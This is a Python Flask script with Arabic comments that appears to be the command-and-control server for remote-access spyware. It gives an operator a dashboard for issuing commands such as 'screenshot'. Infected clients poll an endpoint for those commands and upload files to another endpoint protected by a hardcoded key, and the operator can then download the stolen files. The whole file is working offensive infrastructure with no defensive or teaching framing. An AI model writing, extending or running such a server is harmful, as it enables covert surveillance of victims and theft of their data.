import os
from flask import Flask, request, render_template_string, send_from_directory

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# كلمة السر الخاصة بك
SECRET_KEY = "MySecret2026"

# متغير لتخزين الأمر الحالي (الذي ستكتبه أنت من اللوحة)
current_command = "wait"

HTML_DASHBOARD = '''
<!DOCTYPE html>
<html>
<body>
    <h1>لوحة التحكم</h1>
    <h3>إرسال أمر:</h3>
    <form action="/set_command" method="POST">
        <input type="text" name="cmd" placeholder="اكتب الأمر هنا (مثلاً: screenshot)">
        <button type="submit">إرسال</button>
    </form>
    <h3>الملفات:</h3>
    <ul>{% for file in files %}<li><a href="/download/{{ file }}">{{ file }}</a></li>{% endfor %}</ul>
</body>
</html>
'''

@app.route('/', methods=['GET'])
def dashboard():
    files = os.listdir(UPLOAD_FOLDER)
    return render_template_string(HTML_DASHBOARD, files=files)

@app.route('/upload', methods=['POST'])
def upload():
    if request.headers.get('X-Secret-Key') != SECRET_KEY: return "Unauthorized", 403
    file = request.files.get('file')
    if file: file.save(os.path.join(UPLOAD_FOLDER, file.filename))
    return "OK", 200

@app.route('/get_command', methods=['GET'])
def get_command():
    return {"command": current_command}, 200

@app.route('/set_command', methods=['POST'])
def set_command():
    global current_command
    current_command = request.form.get('cmd')
    return "تم إرسال الأمر!", 200

@app.route('/download/<filename>')
def download(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
